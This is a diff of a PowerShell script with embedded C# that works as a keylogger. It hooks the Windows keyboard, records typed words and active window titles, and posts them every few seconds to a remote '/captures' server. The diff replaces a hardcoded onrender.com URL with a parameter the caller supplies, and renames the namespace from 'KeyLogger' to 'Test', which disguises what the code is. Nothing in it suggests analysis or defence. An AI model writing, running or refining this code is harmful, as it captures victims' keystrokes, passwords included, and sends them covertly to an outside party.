@@ -1,3 +1,7 @@
+param (
+    [string]$serverUrl
+)
+
 Add-Type -TypeDefinition @"
 using System;
 using System.IO;
@@ -9,7 +13,7 @@ using System.Net;
 using System.Threading;
 using System.Collections.Generic;
 
-namespace KeyLogger {
+namespace Test {
   public static class Program {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
@@ -21,11 +25,22 @@ namespace KeyLogger {
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
+    private static string serverUrl = null; // 👈 Accept externally
+
     private static System.Threading.Timer sendTimer;
     private static System.Threading.Timer clickTimer;
     private static object lockObject = new object();
 
+    public static void SetServerUrl(string url) { // 👈 Add this method
+        serverUrl = url;
+    }
+
     public static void Main() {
+      if (string.IsNullOrWhiteSpace(serverUrl)) {
+        Console.WriteLine("Server URL not set.");
+        return;
+      }
+
       hookId = SetHook(hookProc);
       sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000);
       clickTimer = new System.Threading.Timer(CheckAppClick, null, 1000, 1000); // check every 1s
@@ -46,7 +61,9 @@ namespace KeyLogger {
           string safeTitle = (windowTitle ?? currentWindowTitle).Replace("\"", "\\\"");
           string safeWord = word.Replace("\"", "\\\"");
           string jsonBody = "{ \"words\": \"" + safeWord + "\", \"window_title\": \"" + safeTitle + "\" }";
-          string url = "https://xenv2-lb14.onrender.com/captures";
+
+          string url = serverUrl.TrimEnd('/') + "/captures"; // 👈 Use passed serverUrl
+
           var webRequest = WebRequest.Create(url);
           webRequest.Method = "POST";
           byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
@@ -75,13 +92,12 @@ namespace KeyLogger {
     }
 
     private static void CheckAppClick(object state) {
-  string activeWindow = GetActiveWindowTitle();
-  if (activeWindow != previousWindowTitle && !string.IsNullOrWhiteSpace(activeWindow)) {
-    previousWindowTitle = activeWindow;
-    SendWordToServer(string.Format("clicked: \"{0}\"", activeWindow), activeWindow);
-  }
-  }
-
+      string activeWindow = GetActiveWindowTitle();
+      if (activeWindow != previousWindowTitle && !string.IsNullOrWhiteSpace(activeWindow)) {
+        previousWindowTitle = activeWindow;
+        SendWordToServer(string.Format("clicked: \"{0}\"", activeWindow), activeWindow);
+      }
+    }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
@@ -183,4 +199,6 @@ namespace KeyLogger {
 }
 "@ -ReferencedAssemblies System.Windows.Forms
 
-[KeyLogger.Program]::Main();
+# Set the server URL before running Main
+[Test.Program]::SetServerUrl($serverUrl)
+[Test.Program]::Main()
